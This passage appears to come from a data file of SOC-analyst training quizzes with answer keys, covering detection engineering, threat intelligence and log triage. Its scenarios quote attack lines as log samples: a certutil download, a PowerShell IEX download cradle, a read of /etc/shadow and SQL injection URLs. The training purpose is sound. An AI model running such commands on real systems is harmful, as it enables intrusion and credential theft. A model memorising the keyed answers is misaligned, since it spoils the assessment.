        explanation: "Ordering by business impact (and reversibility) is the analyst's primary triage skill. Active ransomware on a financial system is potentially catastrophic and time-critical; recon is informational and can wait. Severity in the queue rarely matches reality — analyst judgement does."
      },
      {
        id: "q4-4",
        difficulty: "hard",
        tags: ["Detection Engineering"],
        scenario: "A new detection 'Encoded PowerShell' fires on:\n  powershell.exe -enc <base64>\nAfter 2 weeks: 1,400 fires, 1,392 from a legitimate SCCM client-action script.",
        question: "What is the BEST evolution of the rule (not just a suppression)?",
        options: [
          "Delete the detection rule completely from the SIEM system because it is too noisy to be useful for operations and causes alert fatigue for the analyst shift.",
          "Lower the alert severity level to informational in the queue and instruct analysts to ignore these logs unless they are correlated with other host compromises.",
          "Move the raw logs to a different archival SIEM platform that is not actively monitored by the SOC team to keep the primary queue clean and focused on alerts.",
          "Refine logic: decode payload and alert on suspicious indicators (e.g. DownloadString, IEX) if parent is not SCCM; maintain approved SCCM hashes on review list."
        ],
        correctAnswer: 3,
        explanation: "Detection engineering > alert handling. The strongest detections combine a behavioral signal (suspicious decoded content), a context filter (parent process), and a maintainable allow-list. Deleting noisy rules surrenders coverage; suppressing them blindly creates blind spots."
      },
      {
        id: "q4-5",
        difficulty: "medium",
        tags: ["Metrics", "SLA"],
        scenario: "Quarterly metrics:\n  MTTD: 14 min  MTTA: 47 min  MTTR: 2 h 30 min\n  Analyst headcount: unchanged.  Alert volume: +60%.",
        question: "Which metric points to the most actionable problem?",
        options: [
          "MTTD — threat detections are slow, meaning the average time from raw log ingestion to alert generation is the primary bottleneck in the system.",
          "MTTR — incident response is slow, meaning contained incidents take too long to fully remediate and recover, suggesting SOAR playbooks are failing.",
          "MTTA — alerts sit unacknowledged for 47m due to capacity/volume mismatch; address this via queue tuning, automation, or staffing adjustments.",
          "Headcount is irrelevant — the metrics indicate that the overall workload is stable and the current staff can handle the alert queue easily."
        ],
        correctAnswer: 2,
        explanation: "MTTD is healthy (detections fire quickly). MTTA being the long pole means alerts are queueing — the lever is reducing volume (tuning), increasing throughput (SOAR/automation), or adding analysts. Knowing which metric to act on is more valuable than memorizing definitions."
      },
      {
        id: "q4-6",
        difficulty: "hard",
        tags: ["Use Case Lifecycle"],
        scenario: "Your SOC manager asks you to propose a NEW detection use case for 'OAuth consent phishing in M365.'",
        question: "Which response best follows the use-case lifecycle?",
        options: [
          "Write a simple detection rule that triggers an alert on every single new OAuth consent grant in the Microsoft 365 environment, then triage them manually in queue.",
          "Contact the M365 security vendor directly and open a feature request asking their support engineers to build and deploy a pre-configured detection rule in production.",
          "Block all OAuth applications globally in Microsoft 365 configuration to completely eliminate the risk of consent phishing without needing any detection rules.",
          "Follow lifecycle: (1) hypothesis, (2) check data source, (3) define logic (unverified publisher + risky scopes), (4) validate in dev, (5) tune, (6) write runbook."
        ],
        correctAnswer: 3,
        explanation: "Mature detection programs follow a lifecycle: hypothesis -> data availability -> logic -> validation -> tuning -> documentation. Skipping any step is how you get rules nobody trusts or knows how to triage."
      }
    ]
  },
  {
    quizId: "q5",
    courseId: "soc-fundamentals",
    title: "Threat Intelligence in Action",
    description: "Scenario quiz on applying CTI to detection, triage, and decisions.",
    passingScore: 75,
    timeLimit: 20,
    questions: [
      {
        id: "q5-1",
        difficulty: "medium",
        tags: ["IOC Lifecycle"],
        scenario: "A vendor IOC feed pushes 80,000 IPs/day. You ingest them all as blocklists. Within a week, you see business outages from blocked legitimate services.",
        question: "What was the core mistake?",
        options: [
          "Ingesting indicators from a vendor feed at all without verifying their source credentials.",
          "Not buying more vendor feeds to confirm the IP reputations before blocking them.",
          "Blocking IPs is always wrong and we should focus entirely on domain names instead.",
          "Treating raw indicators as enforcement data without scoring, source reputation, and expiry lifecycle procedures."
        ],
        correctAnswer: 3,
        explanation: "Mature CTI applies confidence scoring (TLP, source rep), an action tier (alert vs. block), and an expiry policy. Raw firehose feeds belong in detection/enrichment first, enforcement only after scoring."
      },
      {
        id: "q5-2",
        difficulty: "hard",
        tags: ["Diamond Model"],
        scenario: "Investigation finds: adversary 'FIN8', capability 'Sardonic backdoor', infrastructure '198.51.100.50', victim 'retail point-of-sale'.",
        question: "These four facets map to which model, and what is its analytical value?",
        options: [
          "Diamond Model — Adversary, Capability, Infrastructure, Victim; pivoting along any edge expands the investigation.",
          "Cyber Kill Chain — mapped to seven linear phases of an intrusion lifecycle to evaluate chronological progress.",
          "STRIDE — threat modeling framework used to categorize potential software security flaws and system weaknesses.",
          "OWASP Top 10 — standardized list of the most critical security risks for web applications in the industry."
        ],
        correctAnswer: 0,
        explanation: "Diamond Model is built for relational pivoting across the four facets. Each edge enables a hypothesis ('what other victims share this infrastructure?' 'what other capabilities does this adversary use?'). It pairs naturally with ATT&CK and the Kill Chain."
      },
      {
        id: "q5-3",
        difficulty: "medium",
        tags: ["TLP"],
        scenario: "A peer SOC shares a hot indicator marked TLP:AMBER+STRICT. A vendor sales rep asks you to share it for a webinar.",
        question: "What may you do?",
        options: [
          "Share the indicator — vendors are trusted partners and can help disseminate the information safely.",
          "Refuse; TLP:AMBER+STRICT restricts sharing to the recipient organization only; external redistribution is forbidden.",
          "Post it publicly to warn the general community and help other organizations block the threat immediately.",
          "Forward the indicator details to the sales rep but remove the source organization's name to hide the origin."
        ],
        correctAnswer: 1,
        explanation: "TLP:AMBER = limited distribution within the recipient org and clients with need-to-know. The +STRICT modifier removes the 'clients' clause. Violating TLP destroys trust and intel-sharing relationships."
      },
      {
        id: "q5-4",
        difficulty: "hard",
        tags: ["Pivoting", "OSINT"],
        scenario: "You have one C2 domain: secure-update-cdn[.]net (registered 4 days ago, NameCheap, Cloudflare-fronted).",
        question: "Which pivot sequence yields the MOST analytical value?",
        options: [
          "Just block the domain at your web gateway and close the investigation immediately to focus on other queue alerts.",
          "Pivot WHOIS/pDNS/Certs: search registrant email, historical IPs, certificate SANs, and sandbox hosted payload templates.",
          "Run an active aggressive port scan (Nmap) against the domain's Cloudflare-fronted resolution IP address.",
          "Perform a basic Google search on the domain name and read general community forum posts for mentions of it."
        ],
        correctAnswer: 1,
        explanation: "Single-indicator -> infrastructure cluster is the heart of CTI pivoting. WHOIS + passive DNS + cert transparency consistently reveal sibling infrastructure that the adversary is already using or about to use — letting you detect ahead, not behind."
      },
      {
        id: "q5-5",
        difficulty: "medium",
        tags: ["Strategic vs Tactical"],
        scenario: "Your CISO asks: 'Should we be worried about the new Volt Typhoon reporting?' She wants 1 page.",
        question: "Which CTI deliverable level is this?",
        options: [
          "Tactical — file hashes and IP indicators to import directly into a firewall blocklist or SIEM detection rules.",
          "Strategic — business risk, sector targeting, board-level implications and recommended posture changes.",
          "Operational — campaign-level TTPs and hunting hypotheses for the incident response and threat hunting teams.",
          "Technical — malware binary reverse engineering and disassembly analysis for the malware research team."
        ],
        correctAnswer: 1,
        explanation: "CTI tiers: Strategic (executive, business risk), Operational (campaigns/TTPs for IR/hunt), Tactical (IOCs for detection/blocking), Technical (deep reverse engineering). Knowing the audience determines the output."
      },
      {
        id: "q5-6",
        difficulty: "hard",
        tags: ["IOC Confidence"],
        scenario: "Same IP 203.0.113.99 appears in:\n  - Internal: failed C2 sinkhole hit (1 hit, last week)\n  - Open-source feed: '1,200 confidence votes, malware C2'\n  - Commercial: 'shared hosting, mixed reputation'\n  - VirusTotal: 3/89 detections, all generic",
        question: "What is the correct decision?",
        options: [
          "Block immediately at perimeter — the open-source feed has 1,200 votes and the majority of sources flag the IP.",
          "Alert and enrich: shared hosting + low VT + single internal hit = high false-positive risk; collect more context first.",
          "Ignore the IP completely — the VirusTotal score of only 3/89 detection engines confirms the indicator is benign.",
          "Add the IP to threat intelligence report and close the investigation without taking any additional defensive action."
        ],
        correctAnswer: 1,
        explanation: "Shared/CDN infrastructure + thin internal evidence + weak AV consensus = classic 'alert and enrich,' not 'block.' Confidence scoring across sources prevents self-inflicted outages — a recurring real-world CTI failure mode."
      }
    ]
  },
  // Log Analysis Course Quizzes — scenario-based upgrade
  {
    quizId: "la-q1",
    courseId: "log-analysis",
    title: "Log Fundamentals: Formats, Sources & Triage Mindset",
    description: "Scenario-based assessment on log formats, timestamps, normalization, and the analyst mindset for raw log triage.",
    passingScore: 75,
    timeLimit: 20,
    questions: [
        {
          id: "la-q1-1",
          difficulty: "easy",
          tags: ["Log Formats", "Parsing"],
          scenario: "Three log shippers feed your SIEM. Sample lines below — same login event, three formats:\n  A) 2026-06-15T08:14:22Z user=jdoe src=10.1.4.55 action=login status=success\n  B) {\"ts\":\"2026-06-15T08:14:22Z\",\"user\":\"jdoe\",\"src\":\"10.1.4.55\",\"action\":\"login\",\"status\":\"success\"}\n  C) Jun 15 08:14:22 host01 sshd[2231]: Accepted password for jdoe from 10.1.4.55 port 51422 ssh2",
          question: "You need to parse all three reliably into the same schema. Which is true?",
          options: [
            "Format A is JSON, Format B is KV, and Format C is CEF, making all three equally easy to ingest and parse natively in modern SIEM systems.",
            "Format C is the most stable and human-readable representation, which guarantees it will never break when the vendor updates their software version.",
            "Format B (JSON) is the most parser-friendly; Format A (KV) requires a key-value parser, and Format C (syslog) requires custom regex/grok patterns.",
            "All three formats should be stored directly as raw, unparsed string blobs to save indexer CPU and minimize disk storage costs in the SIEM."
          ],
          correctAnswer: 2,
          explanation: "JSON (Format B) is natively structured and self-describing, making it the easiest for modern parsers. KV (Format A) is clean but flat. Syslog (Format C) is semi-structured free text, requiring complex regular expressions or grok patterns that frequently break when vendor formats shift. Raw storage (D) degrades search performance."
        },
        {
          id: "la-q1-2",
          difficulty: "easy",
          tags: ["Timestamps", "Correlation"],
          scenario: "Two systems log the same SSH login:\n  Firewall: 2026-06-15 08:14:22 +0000\n  Linux host: Jun 15 03:14:21 EST",
          question: "Why is this a problem for correlation, and what is the FIRST thing to fix?",
          options: [
            "There is no issue here because both systems are recording the event correctly, and the correlation engine automatically resolves time zone offsets.",
            "Adjust the SIEM correlation rules to accept a broad 6-hour window so that events with drifted timestamps will still match without issue.",
            "Discard the Linux authentication logs since they use a legacy, non-standardized timestamp format that cannot be parsed by modern SIEMs.",
            "Enforce a single time standard (UTC) and ISO 8601 on all sources, and ensure NTP synchronization is active across all log-producing systems."
          ],
          correctAnswer: 3,
          explanation: "Mixed time zones (UTC vs EST) and non-standard layouts break chronological ordering. Standardizing logs to UTC and ISO-8601 timestamps, combined with active NTP client synchronization, is the fundamental first step. Widening correlation windows (B) creates high false-positive rates."
        },
        {
          id: "la-q1-3",
          difficulty: "medium",
          tags: ["Log Levels", "Noise"],
          scenario: "Your app emits ~4M DEBUG lines/day. Storage cost is exploding and analysts ignore the index. The dev team insists DEBUG must stay 'for troubleshooting'.",
          question: "What is the right SOC-side action?",
          options: [
            "Drop DEBUG logs at the forwarder, send WARNING+ to the hot tier, and route verbose logs to cheap cold storage with a short retention window.",
            "Forward every log line to the hot SIEM tier regardless of severity, since storage licensing costs are cheap and visibility should be absolute.",
            "Disable application-level logging entirely on all production servers to eliminate storage costs and reduce the workload on the security team.",
            "Retain all DEBUG logs in the hot tier but mute all alerts associated with them to reduce the noise level in the analyst's triage queue."
          ],
          correctAnswer: 0,
          explanation: "Tiered log routing solves this conflict. We keep high-priority security events (WARNING, ERROR, auth/audit logs) on hot searchable storage, while shipping high-volume DEBUG logs to inexpensive object storage (e.g. S3) with a short lifecycle policy for developer use."
        },
        {
          id: "la-q1-4",
          difficulty: "medium",
          tags: ["Normalization", "CIM"],
          scenario: "Three sources log the same field different names:\n  Palo Alto: src\n  Cisco ASA: SourceIP\n  Windows: IpAddress",
          question: "What concept lets you write ONE detection that matches all three?",
          options: [
            "Log rotation — configuring the servers to periodically archive and compress old logs to prevent local disk space from filling up.",
            "CSV storage format — converting all firewall and operating system logs into comma-separated values for easier manual spreadsheet triage.",
            "Field normalization — mapping disparate vendor fields to a common schema (like Splunk CIM or Elastic ECS) such as src_ip during ingestion.",
            "Log transport encryption — implementing TLS protocols to encrypt logs in transit to prevent interception by unauthorized network sniffers."
          ],
          correctAnswer: 2,
          explanation: "Field normalization (under structures like Splunk's Common Information Model or Elastic Common Schema) standardizes field naming at index time. By mapping different source names to a common field like 'src_ip', a single rule can match events across all devices."
        },
        {
          id: "la-q1-5",
          difficulty: "medium",
          tags: ["Log Sources", "Coverage"],
          scenario: "Management asks: 'We have firewall logs — isn't that enough?' You map current coverage:\n  ✅ Perimeter firewall\n  ❌ Endpoint (no EDR/Sysmon)\n  ❌ Identity (no AD audit)\n  ❌ DNS\n  ❌ Cloud audit (AWS CloudTrail)",
          question: "Which gap most directly blinds you to a successful phishing → credential theft → lateral movement chain?",
          options: [
            "The perimeter firewall log coverage is fully sufficient on its own to detect and block the entire threat lifecycle at the network edge.",
            "Endpoint and identity logs, since the phishing execution occurs on the endpoint and credential abuse must be detected via AD auth events.",
            "Cloud audit logs, which would capture the initial delivery of the phishing email and track the malicious attachment's journey through mailboxes.",
            "DNS logs, since querying the malicious domain is the only detectable phase of a modern multi-stage credential harvesting campaign."
          ],
          correctAnswer: 1,
          explanation: "Firewalls only see network boundary traffic, missing internal behaviors. Endpoint logs capture payload execution, and identity logs (Active Directory logon events) capture credential theft. Both are crucial to visibility during post-compromise stages."
        },
        {
          id: "la-q1-6",
          difficulty: "easy",
          tags: ["Log Integrity", "Forensics"],
          scenario: "Mid-incident, a senior dev offers to 'clean up' a noisy production log file on the compromised host before forensics arrives.",
          question: "Correct response?",
          options: [
            "Refuse the request and preserve the file. Host logs are evidence; you must hash them, copy them to safe storage, and maintain a chain of custody.",
            "Approve the request since DEBUG logs are noise that do not contain security artifacts and cleanup helps speed up the system's performance.",
            "Manually delete the log file yourself immediately to prevent the attacker from tampering with it or using it to discover your defenses.",
            "Email the file to your personal address for analysis and then delete the original from the host to keep the directory clean for developers."
          ],
          correctAnswer: 0,
          explanation: "Modifying or cleaning files on a compromised server alters potential forensic evidence. Security standard practice mandates isolating the host, hashing files to verify integrity, copying logs to a secure central location, and strictly logging the chain of custody."
        },
        {
          id: "la-q1-7",
          difficulty: "medium",
          tags: ["Centralization", "Architecture"],
          question: "Why is shipping logs OFF the endpoint (to a central SIEM/syslog server) a security control, not just an operational one?",
          options: [
            "It formats the logs automatically into clean, standardized visual templates for easier dashboard creation and compliance auditing.",
            "It reduces the CPU utilization on the SIEM indexers by handling all the regex parsing and field extraction directly on the source host.",
            "It ensures compliance because central logs are required by HTTPS and TLS protocol specifications for secure communication.",
            "It prevents anti-forensics because local admins can delete local logs, but they cannot tamper with copies already sent to a central SIEM."
          ],
          correctAnswer: 3,
          explanation: "Centralization mitigates local log tampering. If an attacker gains administrative access on a host, they can execute commands like 'wevtutil cl' to erase trace files. However, logs shipped to a secure, write-once SIEM are preserved out of their reach."
        },
        {
          id: "la-q1-8",
          difficulty: "medium",
          tags: ["Retention", "Compliance"],
          scenario: "Your CISO asks 'what's the minimum log retention we need?' You have PCI-DSS scope (cardholder data) and a typical breach dwell time of 200+ days.",
          question: "Best answer?",
          options: [
            "A retention of 30 days is sufficient, as that matches the standard default configuration recommended by major firewall and EDR vendors.",
            "A short window of 7 days is best, as older data is rarely relevant for incident response and increases storage licensing costs.",
            "At least 1 year total with 3 months online, as PCI-DSS requires this minimum and breach dwell times often exceed several months.",
            "Indefinite retention of all logs on high-performance hot storage to ensure that every event is immediately searchable for forensic audits."
          ],
          correctAnswer: 2,
          explanation: "PCI-DSS requirement 10.5.1 mandates a minimum of 1 year retention, with the last 3 months immediately searchable. Given industry statistics showing breach detection times average over 200 days, short retention windows like 30 days would delete the evidence of the initial breach."
        },
        {
          id: "la-q1-9",
          difficulty: "hard",
          tags: ["Parsing", "Detection Quality"],
          scenario: "A new SaaS app sends logs as:\n  2026-06-15 08:14:22 LOGIN user=\"jdoe\" result=\"OK\" geo=\"IN-Bengaluru\" device=\"mac/Chrome\"\nThe SIEM ingests them as a single unparsed message field. The 'failed logins' dashboard shows ZERO events for this app despite obvious failures.",
          question: "Root cause and fix?",
          options: [
            "The SIEM system itself has crashed or has an internal database error, requiring you to open a priority support ticket with the vendor.",
            "The application is not generating any failed login events because all authentication attempts have been successful during this period.",
            "Failed-login dashboards do not support SaaS application logs natively, requiring you to purchase a specialized SaaS connector addon.",
            "The log is ingested as a raw string but not parsed; without extracting the result field, dashboards filtering on result=FAIL cannot match."
          ],
          correctAnswer: 3,
          explanation: "Without a parsing parser or ingest pipeline, the log entry is treated as a flat string blob. Structured dashboard filters that evaluate fields like 'result' will fail to match. The fix requires building a parser to tokenise the fields before dashboard queries run."
        },
        {
          id: "la-q1-10",
          difficulty: "hard",
          tags: ["Triage Mindset", "Pivoting"],
          scenario: "You see a single suspicious line in the proxy log: a workstation contacting hxxp://185.234.x.x/update.bin at 03:11 local. You have 10 minutes before standup.",
          question: "Which pivot order produces the most signal fastest?",
          options: [
            "Block the destination IP address at the perimeter firewall immediately, close the alert as remediated, and move to the next ticket.",
            "Pivot to DNS to find domain name resolution, EDR for process execution details, auth logs for active user sessions, and proxy logs for scope.",
            "Send an automated email to the user asking if they initiated any downloads at that time, and wait for their response before proceeding.",
            "Perform a hard reboot of the workstation immediately to terminate all network connections and flush out any active in-memory payloads."
          ],
          correctAnswer: 1,
          explanation: "Effective alert triage relies on contextual pivoting. Network logs identify DNS resolution, host EDR correlates network connections to the initiating process (e.g. wscript or certutil), and auth logs link the action to a user profile, establishing full context."
        },
    ]
  },
  {
    quizId: "la-q2",
    courseId: "log-analysis",
    title: "Windows Event Log Investigation",
    description: "Hands-on triage of Security, System, and Sysmon events — logon types, process creation, persistence, and lateral movement.",
    passingScore: 75,
    timeLimit: 25,
    questions: [
        {
          id: "la-q2-1",
          difficulty: "easy",
          tags: ["EID 4624", "Logon Types"],
          scenario: "Security log on FIN-WS-12:\n  EventID=4624  Account=jdoe  LogonType=3  SourceNetworkAddress=10.4.2.55  AuthPackage=NTLM  Time=02:47\nUser jdoe is in IT, normally logs in at 09:00 via interactive console.",
          question: "What is the most accurate interpretation?",
          options: [
            "Routine interactive console login (Type 2) by a user performing standard administrative tasks during normal working hours.",
            "A standard service account login (Type 5) triggered by a scheduled background process running locally on the workstation.",
            "Network logon (Type 3) over NTLM at 02:47 from a different subnet; check the source host and Kerberos tickets on the DC.",
            "A scheduled task logon (Type 4) executing a benign local diagnostic script configured by group policy preferences."
          ],
          correctAnswer: 2,
          explanation: "Logon Type 3 = network logon (SMB/WMI). NTLM at odd hours from an unusual source is a hallmark of lateral movement. Pivot to the source host's 4648 (explicit credentials) and the DC's 4769 (TGS) for Kerberoasting/PtH context."
        },
        {
          id: "la-q2-2",
          difficulty: "easy",
          tags: ["EID 4625", "Brute Force"],
          scenario: "Domain Controller security log shows in 90 seconds:\n  4625 Account=admin  SubStatus=0xC000006A  Source=203.0.113.77   ×42\n  4625 Account=root   SubStatus=0xC0000064  Source=203.0.113.77   ×31\n  4625 Account=test   SubStatus=0xC0000064  Source=203.0.113.77   ×28",
          question: "What attack pattern is this?",
          options: [
            "A single remote user mistyping their password multiple times while attempting to authenticate to their local workstation.",
            "Kerberoasting activity, characterized by a single workstation requesting service tickets for multiple Active Directory SPNs.",
            "Golden Ticket forgery, where an attacker has compromised the KRBTGT account and is generating custom tickets for domain access.",
            "Password spraying/brute force from a single source, as shown by mixed 0xC0000064 (unknown user) and 0xC000006A (bad password) codes."
          ],
          correctAnswer: 3,
          explanation: "0xC0000064 = unknown user (enumeration); 0xC000006A = bad password against a real user. High volume + multiple accounts + one source IP = brute force / spray. Containment: block source, alert IR, check for any 4624 success from the same IP."
        },
        {
          id: "la-q2-3",
          difficulty: "medium",
          tags: ["EID 4688", "Process Creation"],
          scenario: "EID 4688 on FIN-HR-04:\n  NewProcessName=C:\\Windows\\System32\\cmd.exe\n  ParentProcessName=C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\n  CommandLine=cmd /c powershell -enc JABzAD0ATgBlAHcA...",
          question: "Triage call?",
          options: [
            "Malicious Office document execution (T1566.001); isolate the host, decode the PowerShell offline, and check for similar fleet execution.",
            "Benign document processing, where Microsoft Word legitimately spawns cmd.exe to launch system macros and local printer scripts.",
            "Low-priority alert, since system administrators frequently run encoded PowerShell commands for remote endpoint configuration.",
            "No action required, because Event ID 4688 has high false-positive rates and process creation logs are too noisy to trust."
          ],
          correctAnswer: 0,
          explanation: "WINWORD.EXE → cmd.exe → powershell -enc is one of the most reliable malicious patterns in Windows telemetry. Decode the base64 payload offline (don't execute) to confirm C2 / downloader behavior."
        },
        {
          id: "la-q2-4",
          difficulty: "medium",
          tags: ["Sysmon EID 1", "LOLBin"],
          scenario: "Sysmon Event ID 1:\n  Image=C:\\Windows\\System32\\certutil.exe\n  CommandLine=certutil -urlcache -split -f http://185.234.x.x/x.exe C:\\Users\\Public\\x.exe\n  ParentImage=C:\\Windows\\System32\\cmd.exe",
          question: "What is happening?",
          options: [
            "Routine certificate validation and maintenance, where the system checks local certificate trust chains and updates local CRLs.",
            "Standard Windows Update background task download, which uses certutil to fetch signature updates for Windows Defender.",
            "LOLBin abuse (T1105): certutil is used to download an external file; block the URL, isolate the host, and locate the binary.",
            "Enterprise PKI enrollment, where a local domain member machine auto-requests a new client authentication certificate from the CA."
          ],
          correctAnswer: 2,
          explanation: "certutil -urlcache -split -f <url> is a classic Living-Off-the-Land Binary download technique. Real PKI workflows never look like this. Hunt for the dropped binary's hash and any subsequent execution."
        },
        {
          id: "la-q2-5",
          difficulty: "medium",
          tags: ["EID 7045", "Persistence"],
          scenario: "System log on a Domain Controller:\n  EID=7045  ServiceName=AdobeUpdater_x86  ServiceFileName=cmd /c powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://...')\n  AccountName=LocalSystem",
          question: "Verdict?",
          options: [
            "A legitimate Adobe Acrobat background update task configured to check for the latest product patches from the vendor website.",
            "A normal SCCM package installation workflow, which uses temporary local system services to push software updates to servers.",
            "A standard Group Policy software installation push running under local system privileges to deploy mandatory security tooling.",
            "Malicious service persistence (T1543.003), as Adobe never runs IEX from a URL under LocalSystem; stop the service and isolate the host."
          ],
          correctAnswer: 3,
          explanation: "EID 7045 with a PowerShell download-cradle as the service binary = classic persistence (T1543.003). Critical on a DC — escalate to IR immediately and check for similar entries on every host."
        },
        {
          id: "la-q2-6",
          difficulty: "medium",
          tags: ["EID 4672", "Privilege"],
          scenario: "EID 4672 (Special privileges assigned) fires on a workstation for the account 'helpdesk_temp' which is NOT in any admin group per AD.",
          question: "Most likely cause?",
          options: [
            "Token manipulation or unauthorized local admin assignment (T1134/T1078); check local admin groups and Event ID 4732 on the host.",
            "A standard informational logon event indicating the user has been granted their routine, pre-authorized administrative privileges.",
            "An automated Multi-Factor Authentication prompt, which assigns temporary high-privilege tokens while the user completes verification.",
            "A routine Group Policy refresh cycle, which temporarily maps system-level administrative privileges to process policy updates."
          ],
          correctAnswer: 0,
          explanation: "4672 means SeDebug / SeTakeOwnership / SeTcb etc. were granted at logon. If AD says non-admin but 4672 fires, the host has a local admin assignment or the token was elevated. Pair with 4732/4720 to find when it happened."
        },
        {
          id: "la-q2-7",
          difficulty: "medium",
          tags: ["EID 4720", "Account Creation"],
          scenario: "On a member server (not a DC) at 03:22:\n  4720 New account 'svc_backup2' created\n  4732 svc_backup2 added to local Administrators\n  4624 Type 10 (RDP) from 10.7.7.7 by svc_backup2  at 03:25",
          question: "What is this?",
          options: [
            "Standard sysadmin maintenance, where a local user account is created to support automated server backup tasks during scheduled hours.",
            "Adversary creating a local admin for persistence and remote RDP access; disable the account, terminate RDP, and isolate the server.",
            "A routine software installation workflow for a third-party backup agent that requires local administrative privileges to run services.",
            "An automated system behavior occurring when joining a member server to a new sub-domain, creating temporary recovery accounts."
          ],
          correctAnswer: 1,
          explanation: "Local-admin creation followed by immediate RDP from an internal IP is a textbook persistence + lateral movement pattern. Don't just disable — preserve evidence and find how 10.7.7.7 itself was compromised."
        },
        {
          id: "la-q2-8",
          difficulty: "hard",
          tags: ["Sysmon EID 3", "C2"],
          scenario: "Sysmon Event ID 3 (network connect):\n  Image=C:\\Users\\jdoe\\AppData\\Local\\Temp\\update.exe\n  DestinationIp=185.234.x.x  DestinationPort=443  Initiated=true\nFiring every 58–62 seconds for the last 6 hours.",
          question: "Best classification?",
          options: [
            "A normal web browser keepalive connection, which polls standard media servers at regular intervals to maintain active session states.",
            "A standard Windows operating system telemetry upload, which periodically sends system diagnostic details to Microsoft endpoints.",
            "Active command-and-control beaconing; locate the Temp directory binary, analyze the destination IP, and network-isolate the host.",
            "A scheduled security agent or antivirus engine update check, which queries signature definitions from a central server location."
          ],
          correctAnswer: 2,
          explanation: "Periodic outbound from a user-writable Temp directory to a non-corporate IP is a textbook beacon. Even on 443 (TLS) the timing pattern (jitter ±2s around 60s) is the giveaway. JA3 fingerprinting on the proxy confirms."
        },
        {
          id: "la-q2-9",
          difficulty: "hard",
          tags: ["EID 1102", "Anti-Forensics"],
          scenario: "Security log shows:\n  EID 1102 'The audit log was cleared'  SubjectUserName=Administrator  Time=04:01\nNo prior 4634 (logoff) for that admin session.",
          question: "Response?",
          options: [
            "Standard system maintenance, where a local administrator clears the event logs to free up system disk space during servicing.",
            "A temporary glitch where auditing is restarted, and you should re-enable event collection and resume normal monitoring operations.",
            "A scheduled server maintenance task that automatically reboots the system to apply software patches and reset security logs.",
            "An active intrusion indicator (anti-forensics T1070.001); retrieve logs from the central SIEM, trace the session, and start IR."
          ],
          correctAnswer: 3,
          explanation: "1102 by a non-routine account is one of the highest-fidelity 'adversary on the box' signals. The SIEM has the central copy — that's why we ship logs off-host. Pivot to the originating session (4624 Type 10 / Type 3) just before 04:01."
        },
        {
          id: "la-q2-10",
          difficulty: "hard",
          tags: ["Kerberos", "4769"],
          scenario: "On the DC:\n  Many 4769 (TGS request) events from workstation WKS-22 for service names like MSSQLSvc/db01.corp:1433, HTTP/sp01.corp, CIFS/file01.corp, all with TicketEncryptionType=0x17 (RC4-HMAC).",
          question: "What attack is most likely?",
          options: [
            "Routine service authentication, where a domain workstation legitimately requests multiple tickets for database and intranet access.",
            "Kerberoasting activity (T1558.003) using weak RC4 encryption; identify the source account, rotate credentials, and enforce AES.",
            "Golden Ticket abuse, where an attacker has forged domain tickets and is accessing arbitrary server services across the domain.",
            "Pass-the-Hash lateral movement, where the attacker uses NTLM hashes to authenticate directly to network resources without tickets."
          ],
          correctAnswer: 1,
          explanation: "RC4 (etype 0x17) TGS for many SPNs from one workstation is the Kerberoasting signature. Long-term fix: AES-only, group Managed Service Accounts, and long random passwords for SPN-bearing accounts."
        },
    ]
  },
  {
    quizId: "la-q3",
    courseId: "log-analysis",
    title: "Linux & Network Log Investigation",
    description: "Triage SSH, sudo, web, firewall, DNS, and proxy logs across realistic Linux/network scenarios.",
    passingScore: 75,
    timeLimit: 25,
    questions: [
        {
          id: "la-q3-1",
          difficulty: "easy",
          tags: ["auth.log", "SSH"],
          scenario: "/var/log/auth.log on web-edge-02:\n  Jun15 02:11 sshd[2231]: Failed password for invalid user oracle from 45.9.x.x port 51422 ssh2\n  Jun15 02:11 sshd[2232]: Failed password for invalid user postgres from 45.9.x.x port 51424 ssh2\n  Jun15 02:11 sshd[2233]: Failed password for invalid user admin from 45.9.x.x port 51426 ssh2\n  ... 800+ lines in 4 minutes ...",
          question: "What is this and what is the FIRST correct mitigation?",
          options: [
            "A minor misconfiguration in the network logging agent, causing duplicate authentication error reports to be sent.",
            "A large-scale DDoS attack targeting web services, requiring immediate coordination with your external internet provider.",
            "SSH brute-force and user enumeration from a single IP; block the IP at the perimeter, check for successful logons, and enforce key auth.",
            "A routine, pre-authorized vulnerability scan conducted by your internal penetration testing team during scheduled hours."
          ],
          correctAnswer: 2,
          explanation: "'invalid user' = the username doesn't exist (enumeration). Block at the edge (cheap) before tuning. Critically, grep the same IP for 'Accepted password' — any success means the brute force already worked."
        },
        {
          id: "la-q3-2",
          difficulty: "easy",
          tags: ["sudo", "Privilege Abuse"],
          scenario: "/var/log/auth.log:\n  Jun15 04:02 host01 sudo: jdoe : TTY=pts/1 ; PWD=/home/jdoe ; USER=root ; COMMAND=/bin/cat /etc/shadow",
          question: "Verdict?",
          options: [
            "A routine administrative task, as system administrators commonly view the shadow file to manually inspect user password ages.",
            "A standard automated backup operation that copies system configurations to secure offline database locations for recovery.",
            "A routine system patching process where administrative utility scripts query system files to verify configuration baselines.",
            "Privilege abuse or unauthorized credential access (T1003.008); check for subsequent file exfiltration and investigate immediately."
          ],
          correctAnswer: 3,
          explanation: "Reading /etc/shadow grabs hashed passwords for offline cracking. Even with sudo rights, no normal workflow needs this. Look for what jdoe did next (scp, base64, pastebin) and any new 'Accepted' SSH sessions after."
        },
        {
          id: "la-q3-3",
          difficulty: "medium",
          tags: ["Web Logs", "Web Attacks"],
          scenario: "Apache access.log:\n  198.51.100.4 - - [15/Jun/2026:08:14:22 +0000] \"GET /products?id=1%27%20OR%20%271%27=%271 HTTP/1.1\" 200 18422\n  198.51.100.4 - - [15/Jun/2026:08:14:23 +0000] \"GET /products?id=1%27%20UNION%20SELECT%20null,version()-- HTTP/1.1\" 200 19102\n  198.51.100.4 - - [15/Jun/2026:08:14:25 +0000] \"GET /products?id=1%27;%20SELECT%20*%20FROM%20users-- HTTP/1.1\" 200 27310",
          question: "What attack is in progress, and what does the 200 status code tell you?",
          options: [
            "SQL injection (T1190); 200 code indicates the application is responding without blocking, and increasing body sizes point to data extraction.",
            "Cross-Site Scripting (XSS), where a response code of 200 indicates that the WAF successfully blocked and logged the script payload.",
            "Path traversal attempt, where the attacker tries to read restricted server configurations, but the server successfully blocks access.",
            "Cross-Site Request Forgery (CSRF), where the web server processes unauthorized administrative requests because of missing session tokens."
          ],
          correctAnswer: 0,
